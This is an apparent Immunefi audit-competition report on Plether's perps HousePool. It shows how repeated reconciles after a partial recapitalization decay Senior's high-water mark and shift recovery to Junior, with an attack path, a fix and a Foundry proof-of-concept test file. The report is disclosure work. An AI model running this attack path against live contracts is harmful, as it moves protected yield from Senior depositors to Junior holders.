# \#99638 [SC-High] Repeated reconciles after a recapitalization decay Senior's high-water mark

**Submitted on Nov 14th 2026 at 15:28:10 UTC by @Norah for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99638
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
When LP equity is wiped, the Senior high-water mark (HWM) survives on purpose. Future revenue must restore Senior to that mark before Junior receives anything: `absorbLoss` never lowers it, and `distributeRevenue` restores Senior first. The owner's documented recovery tool is `recapitalizePool`.

Two defects break this after a partial recapitalization.

First, the unbacked remainder re-settles against value already credited to Senior. The settleable recap bucket is capped by the full distributable (`HousePool.sol:1829-1834`), and `planReconcile` subtracts it from distributable before the waterfall runs (`HousePoolReconcilePlanLib.sol:66-71`). Once the first reconcile has bootstrapped Senior principal out of the recap, that same value still sits in distributable. Every later reconcile therefore "settles" more recap against it, wiping Senior and bootstrapping it again. Each cycle passes the current outstanding remainder, not the original recap amount, as the bootstrap intent (`HousePool.sol:1598`). So the HWM decays X, then X−D, then X−2D, where D is the distributable. No new cash arrives at any point. Only the reconcile count changes.

Second, the zero-principal bootstrap overwrites the stored pre-wipe mark. `applyClaimantRecapitalizationIntent` (`HousePoolPendingPreviewLib.sol:118-122`) sets `HWM = max(recapIntent, amount)` when both principals are zero, and never looks at the stored, higher mark. Keep one atom of Senior principal and the other branch applies instead: it fills only the gap and leaves the old mark alone. The outcome hinges on whether the wipe was total.

When the pool later recovers, `distributeRevenue` restores Senior only to the decayed mark. The rest goes to Junior, whose holders can redeem it.

## Attack path

Preconditions: a total LP wipe (both principals zero, HWM preserved, seed shares outstanding), then an owner recap X with distributable D < X. A partial recapitalization is the natural case: the owner contributes just enough to clear degraded mode.

1. Reconcile 1 settles D, bootstraps Senior at D, sets HWM = X. The remainder X−D stays pending.
2. Every later reconcile with D at or below the remainder wipes Senior (distributable minus settleable is zero, below Senior principal) and re-bootstraps it at D, with HWM set to the shrinking remainder. The mark falls by D per reconcile.
3. Anyone can drive reconciles. `HousePool.settleLpEpoch(0, 0)` is permissionless when positions are closed or the oracle is frozen (`HousePool.sol:797-811`), and the ordinary hourly keeper settlement produces the same result. A Junior holder can also create the per-call progress the entrypoint needs: while junior principal is zero, a full-balance junior redemption request is refunded, and the refund counts as progress.
4. On recovery, revenue restores Senior only to the decayed mark. The difference lands in Junior principal, and Junior holders redeem it.

The owner's recapitalization is a legitimate, documented action. Per the program page, a legitimate trusted-role action that trips a code bug qualifies.

## Impact

Wipe of Senior 100k and Junior 100k, recap 60k, further 40k loss, distributable 20k:

- One reconcile, then recovery: Senior restored to 60,000, Junior 0. Documented behavior.
- Three reconciles, then the same recovery: HWM decays 60k, 40k, 20k. Senior keeps 20,000 and Junior receives 40,000. The entire protected recovery shifted, with identical pool cash at every step, purely by reconcile count.

The bootstrap-overwrite test isolates the second defect: after a full wipe with HWM 100k, a 50k recap bootstrap lowers the mark to 50k and a later 50k of revenue goes entirely to Junior, while keeping one atom of Senior principal preserves the 100k mark and restores Senior first.

The value at stake scales with Senior's unrestored entitlement, up to the 40M Senior cap: on a 200k pool, Senior's entire 100k entitlement can shift to Junior. Reaching the precondition takes a total LP wipe at an extreme mark (a hedged book needs roughly a 109% basket move to reach zero) and a recap of at least twice the next distributable, which the minimum recap that clears degraded mode at near-cap marks satisfies. Per the program's rules, feasibility limits bear on payout, not on validity.

## Why this is not a known issue

The SC-L1 fix (PR#29) and the Cecuro MED-12 responses say unbacked recapitalization "stays pending, stays reserved everywhere, and gets applied later once it's backed." The code does the opposite: the remainder is applied against value already assigned to Senior. The root cause also differs from MED-12's, which was revenue continuation computed before recapitalization.

The bootstrap NatSpec (`HousePoolPendingPreviewLib.sol:104-110`) describes the mark choice for a fresh bootstrap. It does not authorize erasing an existing protected entitlement, and `absorbLoss` deliberately preserves that entitlement through the wipe. LOW-54 concerns withdrawal rounding of the HWM, a different mechanism. ACCOUNTING_SPEC's rule that a reconcile with no new cash must not change principals is broken by this exact code path.

## Recommendation

Settle unbacked recapitalization only against backing that is not already assigned: cap settleable buckets by the distributable remaining after the waterfall has repriced Senior, Junior, and unassigned assets, or retire the unbackable part explicitly. In the zero-principal branch of `applyClaimantRecapitalizationIntent`, set the HWM to `max(storedMark, recapitalizationTarget, amount)` so no recapitalization can lower a protected entitlement; that change alone prevents the transfer in both defects. Add an invariant test: a reconcile with unchanged physical assets and an unchanged mark never changes Senior principal, Junior principal, or the HWM.

## Proof of Concept

The PoC is a single Foundry test file with three tests on the same wipe-and-recap state. The control test reconciles once and recovers; the attack test reconciles three times before the identical recovery; the third test isolates the bootstrap overwrite of the stored mark. Loss and recovery are modelled by burning and minting pool USDG, exactly the technique the repository's own `test/perps/spec/admin/EngineRecapitalization.t.sol` uses, and reconciles go through `pool.reconcile()`, the vault entrypoint the project's tests call. No file under `src/` is modified, and there is no fuzzing.

To reproduce:

```bash
# 1. Frozen checkout (Foundry Forge 1.5.1, Solidity 0.8.35, via-IR)
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8

# 2. Save the source at the end of this report as packages/perps/test/poc/High01_RecapHwmDecay.t.sol

# 3. Run it
forge test --root packages/perps --match-path 'test/poc/High01_RecapHwmDecay.t.sol' -vv
```

The first compile covers the whole perps package under via-IR and takes several minutes. To compile only the PoC directory instead, prefix the same command with `FOUNDRY_TEST=test/poc` and add `--skip script`, which is how the numbers below were produced.

Expected output, all passing:

```

[PASS] test_PLETHER_High01_Control_OneReconcile_RestoresSenior()
    // asserts: seniorPrincipal == 20_000e6 after the first reconcile,
    //          seniorHighWaterMark == 60_000e6, pending recap == 40_000e6;
    //          after recovery: seniorPrincipal == 60_000e6, juniorPrincipal == 0
[PASS] test_PLETHER_High01_Attack_RepeatedReconciles_DecayHwmAndShiftRecovery()
    // asserts: after three reconciles with no new cash,
    //          seniorHighWaterMark == 20_000e6 (decayed 60k -> 40k -> 20k),
    //          pending recap == 0;
    //          after the same recovery: seniorPrincipal == 20_000e6, juniorPrincipal == 40_000e6
[PASS] test_PLETHER_High01_BootstrapOverwritesPreWipeHwm()
    // asserts: full wipe keeps HWM at 100_000e6; a 50k recap bootstrap lowers it to 50_000e6;
    //          later 50k revenue then goes entirely to junior
```

Reading the tests: the control and the attack reach the same recovery with identical pool cash, and the only difference is how many reconciles happened in between. One reconcile leaves Senior restored at 60,000 with the mark intact; three reconciles decay the mark to 20,000 and the same recovery pays Junior 40,000 instead. The third test shows the second defect on its own: the bootstrap branch sets the mark from the recap and never reads the stored, higher mark, while keeping one atom of Senior principal routes to the gap branch that preserves it.

### PoC source (`packages/perps/test/poc/High01_RecapHwmDecay.t.sol`)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";

/// @notice High 01: unbacked recapitalization remainder re-settles against value already
///         credited to Senior on every reconcile, decaying the bootstrapped high-water mark,
///         and the zero-principal bootstrap discards the stored pre-wipe mark.
///         Loss/recovery modelled by burning/minting pool USDG, as the repository's own
///         recapitalization tests do (test/perps/spec/admin/EngineRecapitalization.t.sol).
contract PocHigh01RecapHwmDecayTest is BasePerpTest {
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    /// @dev One reconcile path: wipe -> 60k recap -> 40k loss (D = 20k) -> single reconcile
    ///      -> recovery. Senior is restored to the full 60k recap; junior gets nothing.
    function test_PLETHER_High01_Control_OneReconcile_RestoresSenior() public {
        _wipePoolAndRecap(60_000e6, 40_000e6);

        vm.prank(address(juniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), 20_000e6, "bootstrap settles D = 20k");
        assertEq(pool.seniorHighWaterMark(), 60_000e6, "HWM starts at the full recap intent");
        assertEq(pool.pendingRecapitalizationAssets(), 40_000e6, "remainder stays pending");

        // Recovery: +40k of pool value. Waterfall restores Senior to the 60k mark first.
        settlementToken.mint(address(pool), 40_000e6);
        vm.prank(address(juniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), 60_000e6, "Senior fully restored");
        assertEq(pool.juniorPrincipal(), 0, "Junior receives nothing");
    }

    /// @dev Attack path: identical state, but three reconciles happen before the recovery
    ///      (a Junior holder or the hourly keeper can drive them). The HWM decays
    ///      60k -> 40k -> 20k and the same recovery credits 40k to Junior.
    function test_PLETHER_High01_Attack_RepeatedReconciles_DecayHwmAndShiftRecovery() public {
        _wipePoolAndRecap(60_000e6, 40_000e6);

        for (uint256 i = 0; i < 3; i++) {
            vm.prank(address(juniorVault));
            pool.reconcile();
        }
        assertEq(pool.seniorPrincipal(), 20_000e6, "senior principal unchanged: no new cash arrived");
        assertEq(pool.seniorHighWaterMark(), 20_000e6, "HWM decayed 60k -> 40k -> 20k");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "remainder fully re-settled against assigned value");

        // Same recovery: Senior keeps only the decayed 20k mark; 40k shifts to Junior.
        settlementToken.mint(address(pool), 40_000e6);
        vm.prank(address(juniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), 20_000e6, "Senior NOT restored");
        assertEq(pool.juniorPrincipal(), 40_000e6, "40k shifted from Senior's entitlement to Junior");
    }

    /// @dev Defect 2 in isolation: after a full wipe, a recap bootstrap overwrites the stored
    ///      pre-wipe HWM (100k) instead of preserving it.
    function test_PLETHER_High01_BootstrapOverwritesPreWipeHwm() public {
        // Full wipe of both principals; the stored HWM survives the wipe by design.
        settlementToken.burn(address(pool), 200_000e6);
        vm.prank(address(juniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.seniorHighWaterMark(), 100_000e6, "wipe must not lower the mark");

        // Owner recaps 50k; distributable equals 50k, so the bootstrap runs.
        settlementToken.mint(address(this), 50_000e6);
        settlementToken.approve(address(engine), 50_000e6);
        engine.recapitalizePool(50_000e6);
        vm.prank(address(juniorVault));
        pool.reconcile();

        assertEq(pool.seniorPrincipal(), 50_000e6);
        assertEq(pool.seniorHighWaterMark(), 50_000e6, "pre-wipe 100k entitlement was discarded");

        // Later revenue goes entirely to Junior because Senior is already at its (lowered) mark.
        settlementToken.mint(address(pool), 50_000e6);
        vm.prank(address(juniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), 50_000e6, "Senior not restored to pre-wipe level");
        assertEq(pool.juniorPrincipal(), 50_000e6, "Senior's protected recovery went to Junior");
    }

    /// @dev Reaches: both principals 0, HWM 100k, pending recap 60k, distributable 20k
    ///      (recap cash 60k minus a further modelled 40k loss).
    function _wipePoolAndRecap(uint256 recap, uint256 furtherLoss) private {
        settlementToken.burn(address(pool), 200_000e6); // total wipe of LP equity
        vm.prank(address(juniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.seniorHighWaterMark(), 100_000e6);

        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        assertEq(pool.pendingRecapitalizationAssets(), recap);

        settlementToken.burn(address(pool), furtherLoss);
    }
}
```

